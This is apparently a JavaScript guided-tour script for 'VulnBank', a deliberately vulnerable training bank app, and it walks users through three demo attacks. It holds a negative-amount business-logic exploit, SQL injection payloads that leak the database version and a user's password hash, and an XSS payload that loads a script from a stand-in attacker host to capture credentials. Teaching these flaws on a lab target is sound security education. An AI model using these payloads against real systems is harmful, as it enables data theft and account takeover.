$(document).ready(function () {
var intro = introJs();
switch (currentPage) {
    case "login.php":
        switch (getUrlParameter('tour')) {
            case "businesslogic":
            case "xss":
            case "sqli":
                $("#transactions > a").attr("href", "transactions.php?tour=businesslogic");
                intro.setOptions({
                    steps: [
                            {
                                       element: ".facts",
                                       intro: "Log into <b>VulnBank</b>"
                                   }
                        ]
                });
                break;
        }
        break;
    case "transactions.php":
        switch (getUrlParameter('tour')) {
            case "businesslogic":
                intro.setOptions({
                    steps: [
                        {
                            element: "#transactions-firstname",
                            intro: "<button class=\"btn btn-info btn-fill\" onclick=\"fillfield('transactions-firstname','Jack');\">Set</button> recipient firstname field to <b>Jack</b> value"
                        },
                        {
                            element: "#transactions-amount",
                            intro: "<button class=\"btn btn-info btn-fill\" onclick='fillfield('transactions-amount','-10');'>Set</button> amount field to $<b>-10</b> value"
                        },
                        {
                            element: "#balance",
                            intro: "Check how much money you currently have on <b>Balance</b>"
                        },
                        {
                            element: "#transactions-submit",
                            intro: "<b>Send</b> money to Jack"
                        },
                        {
                            element: "#balance",
                            intro: "<b>Balance</b> has increased"
                        }
                    ]
                });
                break;
            case "sqli":
                intro.setOptions({
                    steps: [
                        {
                            element: "#transactions-firstname",
                            intro: "<button class=\"btn btn-info btn-fill\" onclick=\"fillfield('transactions-firstname','Jack\\' and extractvalue(0x0a,concat(0x0a,(select version()))) and \\'1\\'=\\'1');\">Inject</button> SQL query to firstname parameter"
                        },
                        {
                            intro: "Database version was retrieved"
                        },
                        {
                            element: "#transactions-firstname",
                            intro: "<button class=\"btn btn-info btn-fill\" onclick=\"fillfield('transactions-firstname','none\\' union select 1,2,login,password,5,6,7,NULL,NULL,10,11,12,13,14,15,16,17 from users limit 1 -- 1');\">Inject</button> another SQL query to get password hash of first user"
                        },
                        {
                            element: "#transactions-lastname",
                            intro: "Password hash was retrieved from database.</br>If it is weak enough, one can <button class=\"btn btn-info btn-fill\" onclick=\"window.open('https://md5hashing.net/hash/sha256/'+document.getElementById('transactions-lastname').value,'_blank');\">revert</button> original password from hash"
                        }
                    ]
                });
            break;
        }
        break;
    case "history.php":
        switch (getUrlParameter('tour')) {
            case "xss":
                if (window.location.hash) {
                    intro.setOptions({
                        steps: [
                            {
                                intro: "Fake form is placed into page contents"
                            },
                            {
                                element: "#history-searchdiv",
                                intro: "Input your credentials into fake login form"
                            },
                            {
                                intro: "Submit form and go to <a href='https://evil.vulnbank.com/log.txt' target=\"_blank\">evil.vulnbank.com/log.txt</a> to check that attacker got your credentials"
                            }
                        ]
                    });
                } else {
                    intro.setOptions({
                        steps: [
                            {
                                element: "#history-searchfield",
                                intro: "<button class=\"btn btn-info btn-fill\" onclick=\"fillfield('history-searchfield','&lt;script src=https://evil.vulnbank.com/xss.js&gt;&lt;/script&gt');\">Set</button> <b>Search</b> with value <pre>&lt;script src='https://evil.vulnbank.com/xss.js&gt;&lt;/script&gt;</pre>"
                            },
                            {
                                intro: "<button class=\"btn btn-info btn-fill\" onclick=\"location.reload();\">Reload</button> the page"
                            }
                        ]
                    });
                }
                break;
        }
        break;
    case "portal.php":
        switch (getUrlParameter('tour')) {
            case "businesslogic":
            case "sqli":
                $("#menu-transactions > a").attr("href", "transactions.php?tour="+getUrlParameter('tour'));
                intro.setOptions({
                    steps: [
                        {
                            element: "#menu-transactions",
                            intro: "Go to <b>Transactions</b> tab"
                        }
                    ]
                });
                break;
            case "xss":
                $("#menu-history > a").attr("href", "history.php?tour=xss");
                intro.setOptions({
                    steps: [
                        {
                            element: "#menu-history",
                            intro: "Go to <b>Hisotry</b> tab"
                        }
                    ]
                });
                break;
        }
        break;
}
intro.start();

});
